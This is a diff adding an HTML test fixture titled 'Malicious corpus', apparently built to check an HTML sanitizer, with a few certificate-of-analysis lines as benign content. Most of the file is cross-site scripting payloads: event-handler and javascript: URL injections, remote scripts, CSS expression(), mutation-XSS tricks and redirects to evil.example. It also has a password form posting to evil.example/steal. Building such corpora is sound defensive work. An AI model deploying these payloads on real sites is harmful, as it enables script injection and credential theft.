@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0;url=https://evil.example/redirect">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/remote.css">
+<title>Malicious corpus</title>
+<style>
+@import url("https://evil.example/imported.css");
+@import 'https://evil.example/imported2.css';
+@font-face { font-family: remote; src: url(https://evil.example/font.woff) format("woff"); }
+body { background: url('https://evil.example/bg.png'); width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(x.xml#x); }
+.ok { color: #222; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==); }
+</style>
+<script>window.__pwned = "head-script";</script>
+<script src="https://evil.example/remote.js"></script>
+</head>
+<body onload="window.__pwned='body-onload'">
+<p class="ok">Certificate of Analysis</p>
+<p>Batch No.: AVVS1122005</p>
+<div onclick="alert(1)" onmouseover="alert(2)">Expiry Date: 11/2025</div>
+<img src="https://evil.example/tracker.png" alt="remote image">
+<img src="x" onerror="window.__pwned='img-onerror'" alt="onerror">
+<img src="javascript:alert(1)" alt="js src">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" alt="data image ok">
+<a href="javascript:window.__pwned='a-href'">click me</a>
+<a href="https://evil.example/">external link</a>
+<div style="background:url(https://evil.example/inline.png); color: red">Inline remote url</div>
+<div style="width: expression(alert(1))">Inline expression</div>
+<iframe src="https://evil.example/frame"></iframe>
+<object data="https://evil.example/x.swf"></object>
+<embed src="https://evil.example/x.swf">
+<form action="https://evil.example/steal"><input name="password" type="password"><button>Send</button></form>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">noscript</p></noscript>
+<template><img src=x onerror="window.__pwned='template'"></template>
+<svg width="40" height="40" viewBox="0 0 40 40">
+  <script>window.__pwned = "svg-script";</script>
+  <foreignObject width="40" height="40"><iframe src="https://evil.example/fo"></iframe></foreignObject>
+  <image href="https://evil.example/svg-image.png" width="10" height="10"></image>
+  <a href="javascript:alert(1)"><rect width="10" height="10" fill="red"></rect></a>
+  <animate onbegin="alert(1)" attributeName="x"></animate>
+  <rect x="5" y="5" width="30" height="30" fill="#2a6" onload="alert(1)"></rect>
+  <style><img src=x onerror="window.__pwned='svg-style-mxss'"></style>
+</svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
+<p>Origin: JORDAN</p>
+</body>
+</html>
